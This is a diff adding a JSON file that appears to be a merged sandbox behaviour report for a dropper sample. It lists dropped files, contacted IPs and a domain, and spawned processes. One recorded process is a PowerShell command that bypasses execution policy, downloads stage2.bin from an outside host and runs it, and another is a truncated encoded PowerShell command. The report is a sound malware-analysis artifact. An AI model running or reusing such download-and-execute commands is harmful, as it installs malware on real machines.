@@ -1,0 +1,40 @@
+{
+  "virustotal_sample_behavior": {
+    "sha256": "7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
+    "summary_type": "merged_behavior_summary",
+    "contributing_sandboxes": [
+      "CAPE Sandbox",
+      "Falcon Sandbox Cloud Engine"
+    ],
+    "aggregated_observations": {
+      "tags": [
+        "powershell",
+        "dropper",
+        "network-activity",
+        "c2-traffic"
+      ],
+      "files_dropped": [
+        "C:\\Users\\analyst\\AppData\\Local\\Temp\\update_payload.exe",
+        "C:\\Users\\analyst\\AppData\\Local\\Temp\\mutex_flag.tmp",
+        "C:\\sandbox\\temp\\staged_runner.bin",
+        "C:\\sandbox\\crash_reporter.log"
+      ],
+      "ip_traffic": [
+        "198.51.100.42:443",
+        "203.0.113.88:8080"
+      ],
+      "dns_lookups": [
+        "cloud-storage-cdn.net"
+      ],
+      "processes_created": [
+        "\"C:\\Users\\analyst\\AppData\\Local\\Temp\\invoice_oct2026.exe\"",
+        "cmd.exe /c \"powershell -enc JABzAD0ATgBlAHcALQBPAGIA... -ExecutionPolicy Bypass\"",
+        "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"Invoke-WebRequest -Uri https://cloud-storage-cdn.net/stage2.bin -OutFile C:\\Users\\analyst\\AppData\\Local\\Temp\\update_payload.exe; Start-Process C:\\Users\\analyst\\AppData\\Local\\Temp\\update_payload.exe\"",
+        "\"C:\\Users\\analyst\\AppData\\Local\\Temp\\update_payload.exe\"",
+        "\"C:\\sandbox\\samples\\invoice_oct2026.exe\"",
+        "\"C:\\sandbox\\temp\\staged_runner.bin\""
+      ]
+    },
+    "limitations_noted_by_vt": "None (VirusTotal aggregates all observed outputs into a merged flat set without cross-run diffing, provenance mapping, or causal explanation for discrepancies)."
+  }
+}
